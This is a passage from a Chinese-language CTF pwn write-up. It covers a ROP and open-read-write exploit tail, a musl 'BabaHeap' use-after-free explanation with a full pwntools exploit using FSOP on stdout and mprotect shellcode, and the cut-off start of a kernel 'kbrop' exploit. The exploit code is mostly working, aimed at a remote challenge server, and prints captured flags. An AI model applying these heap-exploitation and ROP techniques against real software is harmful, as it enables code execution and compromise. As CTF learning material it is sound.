    struct =p64(address)+p64(0)*3+p64(setcontext)
    struct =struct.ljust(0x68, '\x00')
    struct+=p64(rdi)+p64(rsi)+p64(0)*2+p64(rdx)+p64(0)*2+p64(rsp)+p64(read)
    Add_Del(0x2f0, p64(rdx2rdi)+struct)
    rdx = 0x000000000011c371+base# rdx+r12
    sys = 0x7ffff7e7f1e5-0x7ffff7d6e000+base
    rax = 304464+base
    rdi = 158578+base
    rsi = 161065+base
    rcx = 653346+base
    rax_r10 = 0x000000000005e4b7+base
    rop = p64(rdi)
    rop += p64(0xdddd000)
    rop += p64(rsi)
    rop += p64(0x1000)
    rop += p64(rdx)
    rop += p64(7)
    rop += p64(0)
    rop += p64(rcx)
    rop += p64(0x22)
    rop += p64(0x7ffff7e89a20-0x7ffff7d6e000+base)
    rop += p64(rax)
    rop += p64(0)
    rop += p64(rdi)
    rop += p64(0)
    rop += p64(rsi)
    rop += p64(0xdddd000)
    rop += p64(rdx)
    rop += p64(0x1000)
    rop += p64(0)
    rop += p64(sys)
    rop += p64(0xdddd000)
    sn(rop.ljust(0x100, '\x00'))
    #context.log_level='debug'
    sc='''
    mov rax,1
    mov rdi,1
    mov rsi,0xdddd300
    mov rdx,0x600
    syscall
    '''
    fk='''
    mov rdi,rax
    mov rax,0
    mov rsi,0xdddd300
    mov rdx,100
    syscall
    mov rax,1
    mov rdi,rax
    syscall
    '''
    # flag-03387efa-0ad7-4aaa-aae0-e44021ad310a
    # poc = asm(shellcraft.open(b'/home/pwn/'))+asm(shellcraft.getdents64(3, 0xdddd000 + 0x300, 0x600))+asm(sc)
    poc = asm(shellcraft.open(b'/home/pwn/flag-03387efa-0ad7-4aaa-aae0-e44021ad310a'))+asm(fk)
    sn(poc)
    pause()
    irt()
###  BabaHeap
题目的漏洞点在于 delete 功能未清空 ptr 和 update 功能未检测 use 位，导致可以对释放后的 chunk 进行写入操作。  
另外，题目的读取函数允许我们输入 `size - 1` 的内容，然后最后一位设置为 `\0`。
题目的麻烦点在于信息泄露，这里需要利用到读取函数的置 0 操作，另外题目提供的 release 版本的 libc，没有符号信息，只能凭感觉来调试。  
每个 bin 入链了第一个 chunk 后，该 chunk 的 next 和 prev 也会指向 `bin_head -0x10`，利用读取函数，我们能修改到已释放的 chunk 的 `next`，我们演示一下：
  1. 我们释放掉一个 `0x1b0` 大小的 chunk，此时它的 next 和 prev 都指向 `bin_head - 0x10`：  
  1. 利用读取函数对该 chunk 进行写入操作：  
    此时，我们的 chunk next 指向了另一个 bin，恰好是 0x120 的 chunk 所在的 bin_head - 0x10 的位置。
  1. 我们释放掉 `0x120` 的 chunk，以使得 `0x00007ff51cb4bb00` 的位置有合法的 next 和 prev：  
  1. 我们再一次申请这个 `0x1b0` 的 chunk，那么`bin_head` 就会指向 `0x120` 的`bin_head - 0x10` 的位置。
  2. 我们再申请一个 `0x1b0`，就可以将 chunk 分配到 `0x120` 的 `bin_head - 0x10` 的位置，从而控制住这一片 `mal` 区域。
  3. 我们只要在 chunk 能够覆盖的区域内的 bin 中，入链一个 chunk，即可得到该 chunk 的地址，进而泄露 libc 基址，以及所有 chunk 地址、mal 地址等信息。
泄露了 libc 之后，剩下就是常规操作：
  1. 利用 unbin 在 stdout 前伪造合法的 `next` 和 `prev`
  2. 再利用 unbin，将 stdout 所在的 chunk **合法** 地放入 bin->head 中
  3. 提前布置好 rop_chain，申请 chunk 得到 stdout 并在合适的位置上填写 **poc** 实现 FSOP，劫持 rip 和 rsp 读取到 flag。
EXP：
    #encoding:utf-8
    from pwn import *
    import re
    ip = '1.116.236.251'
    port = 11124
    local = 0
    filename = './babaheap'
    libc_name = './libc.so.1'
    def create_connect():
        global io, elf, libc
        elf = ELF(filename)
        context(os=elf.os, arch=elf.arch)
        if local:
            io = process(filename)
            libc_name = './libc.so.1'
        else:
            io = remote(ip, port)
            libc_name = './libc.so.1'
        try:
            libc = ELF(libc_name)
        except:
            pass
    cc = lambda : create_connect()
    s = lambda x : io.send(x)
    sl = lambda x : io.sendline(x)
    sla = lambda x, y: io.sendlineafter(x, y)
    sa = lambda x, y: io.sendafter(x, y)
    g = lambda x: gdb.attach(io, x)
    r = lambda : io.recv(timeout=1)
    rr = lambda x: io.recv(x, timeout=1)
    rl = lambda : io.recvline(keepends=False)
    ru = lambda x : io.recvuntil(x)
    ra = lambda : io.recvall(timeout=1)
    it = lambda : io.interactive()
    cl = lambda : io.close()
    def regexp_out(data):
        patterns = [
            re.compile(r'(flag{.*?})'),
            re.compile(r'xnuca{(.*?)}'),
            re.compile(r'DASCTF{(.*?)}'),
            re.compile(r'(WMCTF{.*?})'),
            re.compile(r'[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}-[0-9a-zA-Z]{5}'),
        ]
        for pattern in patterns:
            res = pattern.findall(data.decode() if isinstance(data, bytes) else data)
            if len(res) > 0:
                return str(res[0])
        return None
    def allocate(size, content=b'callmecro'):
        sla(b'Command: ', b'1')
        sla(b'Size: ', str(size).encode())
        if size == len(content):
            sa(b'Content: ', content)
        else:
            sla(b'Content: ', content)
    def no_send_allocate(size, content=b'callmecro'):
        sla(b'Command: ', b'1')
        sla(b'Size: ', str(size).encode())
        if size == len(content):
            s(content)
        else:
            sl(content)
    def update(idx, size, content=b'callmecro'):
        sla(b'Command: ', b'2')
        sla(b'Index: ', str(idx).encode())
        sla(b'Size: ', str(size).encode())
        if size  通过 unbin，将 stdout_FILE 送上 head 位置
        allocate(0x120)
        # mov     rdx, [rdi+30h];mov     rsp, rdx;mov     rdx, [rdi+38h];jmp     rdx
        stack_mig = libc.address + 0x78D24
        ret = libc.address + 0x15292
        pop_rdi = libc.address + 0x15291
        pop_rsi = libc.address + 0x1d829
        pop_rdx = libc.address + 0x2cdda
        pop_rax = libc.address + 0x16a16
        syscall = libc.address + 0x23720
        rop_chain = libc.address + 0xb3a20
        rop = flat([
            pop_rdi, data_segment,
            pop_rsi, 0x8000,
            pop_rdx, 7,
            mprotect, rop_chain+0x40
            ])
        rop += asm(shellcraft.open('/flag'))
        rop += asm(shellcraft.read(3, data_segment, 0x100))
        rop += asm(shellcraft.write(1, data_segment, 0x50))
        update(5, 0x100, rop)
        poc = flat({
            0x30: 1,        # f->wpos
            0x38: 1,        # f->wend
            0x40: rop_chain, 
            0x48: ret, 
            0x58: stack_mig,# f->write
            0x70: 1,        # f->buf_size
        }, filler=b'\x00', length=0x120)
        # 7 -----> 分配到 stdout_FILE
        no_send_allocate(0x120, poc)
        log.success('flag: %s', regexp_out(ru(b'}')))
        # flag{use_musl_4ft3r_fr33}
        cl()
    if __name__ == '__main__':
        pwn()
###  kbrop
直接当作没有ksalr，然后爆破差不多几百次能出
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    void errExit(char* msg)